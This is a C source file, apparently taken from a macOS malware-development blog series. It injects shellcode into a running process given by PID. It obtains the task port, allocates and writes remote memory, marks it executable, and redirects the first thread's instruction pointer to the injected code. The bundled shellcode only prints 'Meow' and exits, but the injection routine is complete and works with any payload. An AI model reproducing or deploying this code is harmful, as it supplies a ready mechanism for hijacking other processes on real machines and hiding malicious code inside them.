/*
 * hack.c
 * macOS x86_64 shellcode injection via ptrace
 * author @cocomelonc
 * https://cocomelonc.github.io/macos/2025/08/19/malware-mac-9.html
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/thread_act.h>
#include <mach/mach_vm.h>
#include <mach/thread_status.h>

unsigned char shellcode[] =
  "\x48\xb8\x4d\x65\x6f\x77\x0a\x00\x00\x00"
"\x50\xbf\x01\x00\x00\x00"
"\x48\x89\xe6\xba\x05\x00\x00\x00"
"\xb8\x04\x00\x00\x02\x0f\x05"
"\xb8\x01\x00\x00\x02\x48\x31\xff\x0f\x05";

int main(int argc, char *argv[]) {
  if (argc != 2) {
    fprintf(stderr, "usage: %s <pid>\n", argv[0]);
    return 1;
  }

  pid_t pid = atoi(argv[1]);
  task_t task;
  kern_return_t kr = task_for_pid(mach_task_self(), pid, &task);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] task_for_pid() failed: %s\n", mach_error_string(kr));
    return 1;
  }
  printf("[+] attached to pid %d\n", pid);

  mach_vm_address_t remote_addr = 0;
  kr = mach_vm_allocate(task, &remote_addr, sizeof(shellcode), VM_FLAGS_ANYWHERE);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] mach_vm_allocate failed: %s\n", mach_error_string(kr));
    return 1;
  }
  printf("[+] allocated memory at 0x%llx\n", remote_addr);

  kr = mach_vm_write(task, remote_addr, (vm_offset_t)shellcode, sizeof(shellcode));
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] mach_vm_write failed: %s\n", mach_error_string(kr));
    return 1;
  }
  printf("[+] wrote shellcode\n");

  // make memory RX
  kr = mach_vm_protect(task, remote_addr, sizeof(shellcode), FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] mach_vm_protect failed: %s\n", mach_error_string(kr));
    return 1;
  }
  printf("[+] set memory RX\n");

  thread_act_t thread;
  thread_array_t thread_list;
  mach_msg_type_number_t thread_count = 0;
  kr = task_threads(task, &thread_list, &thread_count);
  if (kr != KERN_SUCCESS || thread_count < 1) {
    fprintf(stderr, "[-] task_threads failed: %s\n", mach_error_string(kr));
    return 1;
  }

  thread = thread_list[0];
  x86_thread_state64_t state;
  mach_msg_type_number_t state_count = x86_THREAD_STATE64_COUNT;

  kr = thread_get_state(thread, x86_THREAD_STATE64, (thread_state_t)&state, &state_count);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] thread_get_state failed: %s\n", mach_error_string(kr));
    return 1;
  }

  printf("[+] RIP before: 0x%llx\n", state.__rip);
  state.__rip = remote_addr;
  kr = thread_set_state(thread, x86_THREAD_STATE64, (thread_state_t)&state, state_count);
  if (kr != KERN_SUCCESS) {
    fprintf(stderr, "[-] thread_set_state failed: %s\n", mach_error_string(kr));
    return 1;
  }

  printf("[+] RIP set to 0x%llx. shellcode running in PID %d\n", remote_addr, pid);
  return 0;
}
